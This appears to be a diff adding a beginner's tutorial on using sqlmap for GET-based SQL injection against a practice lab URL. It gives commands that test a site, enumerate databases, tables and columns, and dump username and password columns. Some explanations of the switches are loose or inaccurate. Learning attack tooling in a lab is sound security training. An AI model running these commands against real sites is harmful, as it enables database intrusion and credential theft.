@@ -1,0 +1,28 @@
+http://15.206.168.72/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-2/?category=1
+(Use the above url for practice purpose)
+
+- To check Version in windows powershell
+  Command : python sqlmap.py --version
+
+- To check whether the web app is vulnerable or not 
+  command : python sqlmap.py -u "URL OF WEB APPLICATION" 
+
+- To know the web app data base if the web app is configured as vulnerable 
+  the command is
+  command : python sqlmap.py -u "URL" --dbs 
+**Here '--dbs ' is used to know the the data base names in the informaiton_schema
+  consider the data base name as 'vannakkam'
+
+-To get connect with data base and to get the table names with in that data base 
+ command : python sqlmap.py -u "URL" -D "vannakkam" --table
+**The -D switch is used to get connection with the data base 
+**--tables gives the tables names with in that database ie. vannakkam
+
+-To get connected with tables and to know the columns name with in the table 
+ command : python sqlmap.py -u "URL" -D "vannakkam" -T "table_name" --column
+**Here ' -T ' is to get connected with the tables with in the data base and --column is to get column names   
+  with in the data base
+
+-To fetch the required data in a table
+ command : python sqlmap.py -u "URL" -D "vannakkam" -T "table_name" -C "username,password" --dump
+**Here the -C is to maintain the connection with the columlns and --dump is used to display all the data
